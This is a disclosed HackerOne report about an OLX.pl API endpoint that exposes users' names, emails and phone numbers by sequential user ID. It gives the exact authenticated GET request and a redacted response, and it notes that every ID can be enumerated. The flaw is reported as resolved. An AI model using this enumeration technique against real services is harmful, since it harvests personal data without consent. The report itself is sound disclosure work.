---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '171917'
original_report_id: '171917'
title: Name, email, phone and more disclosure on user ID (API)
weakness: Information Disclosure
team_handle: olx
created_at: '2016-09-25T17:45:57.070Z'
disclosed_at: '2016-10-20T11:52:59.268Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- information-disclosure
---

# Name, email, phone and more disclosure on user ID (API)

## Metadata

- HackerOne Report ID: 171917
- Weakness: Information Disclosure
- Program: olx
- Disclosed At: 2016-10-20T11:52:59.268Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,

When I checked the OLX.pl app, I found out that when I click on a profile, personal information like email or phonenumber is exposed.

> GET https://ssl.olx.pl/api/v1/users/1/ HTTP/1.1
Host: ssl.olx.pl
Cookie: PHPSESSID=hb6utlcj860nd7p2jt6ha0tu71
Connection: keep-alive
Accept: */*
Version: v1.1
User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 10_0_1 like Mac OS X; en-us) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D5145e / iPhone App Ver 3.5.10
Accept-Language: pl
Authorization: Bearer d98f47721e5b2974e526f78438c3e32f6c939ec7
Accept-Encoding: gzip, deflate

When I request a GET request to https://ssl.olx.pl/api/v1/users/1/ (Notice: need to have Authorization header included) I get this JSON response:

> {
    "data": {
        "id": 1,
        "email": " HIDDEN FOR HACKERONE ",
        "created": "2009-02-02T22:17:30+01:00",
        "last_login": "2016-07-20T07:11:33+02:00",
        "is_business": false,
        "name": " HIDDEN FOR HACKERONE ",
        "show_photo": true,
        "user_photo": null,
        "social_network_account_type": null,
        "sms_phone": null,
        "is_online": false,
        "last_seen": null,
        "user_ads_url": "http://www.olx.pl/oferty/user/1/",
        "position": null
    }
}

This json includes email, name and phone number (if added to profile). This is information that should be hidden. Now it is easy to request every ID (1,2,3,...) and retrieve the information.

- Matthew

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
